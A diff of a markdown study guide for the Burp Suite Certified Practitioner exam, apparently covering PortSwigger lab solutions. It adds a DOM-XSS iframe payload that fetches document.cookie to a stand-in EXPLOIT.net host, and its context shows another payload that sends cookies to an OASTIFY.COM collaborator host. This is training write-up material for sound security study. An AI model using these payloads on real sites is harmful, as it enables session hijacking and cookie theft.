@@ -415,17 +415,27 @@ From the Site Map, open the `searchResults.js` file and notice that the JSON res
 
 ### DOM-XSS LastviewedProduct Cookie  
 
->Identify the cookie ```lastViewedProduct``` is set to the last URL visited under the product page. In the `source code` we identify the injection script tags where ```window.location``` is set.   
+>***Identify*** the cookie ```lastViewedProduct``` is set to the last URL visited under the product page.  
+>In the `source code` we identify the injection script tags where ```window.location``` is set.  
 
 ![DOM-XSS lastViewedProduct cookie code](images/dom-xss-lastViewedProduct-cookie.png)  
 
->Testing the escape out of of the script string for the value of **document.location** using ```/product?productId=1&'>fuzzer```. Note that **document.location** value cannot be URL encoded.  
+>Testing the escape out of of the script string for the value of **document.location** using ```/product?productId=1&'>fuzzer```.  
+>Note that **document.location** value cannot be URL encoded.  
+
+>On exploit server add the following iframe to the body:  
 
 ```html
-<iframe src="https://TARGET.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://TARGET.net';window.x=1;">
+<iframe src="https://TARGET.net/product?productId=1&'><script>fetch('https://EXPLOIT.net/log?c='%2bdocument.cookie)</script>" onload="if(!window.x)this.src='https://TARGET.net';window.x=1;">
+</iframe>
+
 ```  
 
-I am unable to get a working cookie stealer payload for this vulnerable lab.......
+!DOM_based_cookie_manipulation.png](/images/DOM_based_cookie_manipulation.png)  
+
+Once the victim cookie is updated the Exploit server log captures their secret cookie value.  
+
+>With the great help from ***ShehmeerAbidRajput*** I updated this lab with his provided cookie stealer payload.  
 
 [PortSwigger Lab: DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)  
   
@@ -518,7 +528,8 @@ document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
 
 [PortSwigger Cheat-sheet XSS Example: onpopstate event](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  
 
->Below JavaScript is hosted on exploit server and then deliver to victim. The `code` is an iframe doing **onload** and the search parameter is vulnerable to **onpopstate**.  
+>Below JavaScript is hosted on exploit server and then deliver to victim.  
+>The `code` is an iframe doing **onload** and the search parameter is vulnerable to **onpopstate**.  
 
 ```JavaScript
 <iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie>"></iframe>
@@ -3980,7 +3991,8 @@ CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
 
 >Tips from [Daniel Redfern](https://youtu.be/Lbn8zQJByGY?t=551) is best I have come access explaining fundamental mechanics in BSCP exam, especially Tip 7, only one active user per application and if you reach stage 2 and you did not use interactive exploit in stage 1 that required the **Deliver to Victim** function of the exploit server, then use an interactive exploit on stage 2 to reach admin user role.
 
->[Hacking-Notes](https://github.com/Hacking-Notes) created a awesome website with an interactive checklist to help people during BSCP exams to track phases of attacks:  
+>[Hacking-Notes](https://github.com/Hacking-Notes) created a awesome website with an interactive checklist to help people during BSCP exams.  
+>Track phases of attacks checklist:  
 >[https://bscp.guide](https://bscp.guide)  
   
 >When stuck in BSCP exam, reference the below [Micah van Deusen blog tip 5 table of category to stages](https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/) for ways to progress through the stages.  
